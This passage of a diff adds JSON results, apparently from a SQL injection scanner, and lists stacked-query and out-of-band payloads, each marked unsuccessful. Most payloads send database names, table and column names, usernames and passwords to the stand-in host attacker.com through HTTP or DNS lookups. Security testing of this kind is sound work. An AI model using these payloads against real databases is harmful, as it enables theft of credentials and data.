+        "payload": "'; SELECT COUNT(*) FROM users--",
+        "type": "stacked_queries",
+        "success": false,
+        "response_time": 1.128385066986084,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual--",
+        "type": "out_of_band",
+        "success": false,
+        "response_time": 1.1267058849334717,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\'))--",
+        "type": "out_of_band",
+        "success": false,
+        "response_time": 1.1253046989440918,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.attacker.com')--",
+        "type": "out_of_band",
+        "success": false,
+        "response_time": 0.9610099792480469,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT database() FROM dual)) FROM dual--",
+        "type": "out_of_band",
+        "success": false,
+        "response_time": 1.291637659072876,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT table_name FROM information_schema.tables WHERE ROWNUM=1)) FROM dual--",
+        "type": "out_of_band",
+        "success": false,
+        "response_time": 1.7331528663635254,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT column_name FROM information_schema.columns WHERE ROWNUM=1)) FROM dual--",
+        "type": "out_of_band",
+        "success": false,
+        "response_time": 1.3397061824798584,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT username FROM users WHERE ROWNUM=1)) FROM dual--",
+        "type": "out_of_band",
+        "success": false,
+        "response_time": 1.1300814151763916,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE ROWNUM=1)) FROM dual--",
+        "type": "out_of_band",
+        "success": false,
+        "response_time": 0.8963243961334229,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT database() FROM dual)||'.attacker.com')--",
+        "type": "out_of_band",
+        "success": false,
+        "response_time": 1.1524486541748047,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT table_name FROM information_schema.tables WHERE ROWNUM=1)||'.attacker.com')--",
+        "type": "out_of_band",
+        "success": false,
+        "response_time": 1.1263744831085205,
+        "confidence": 0.0
+      }
+    ]
+  }
+}
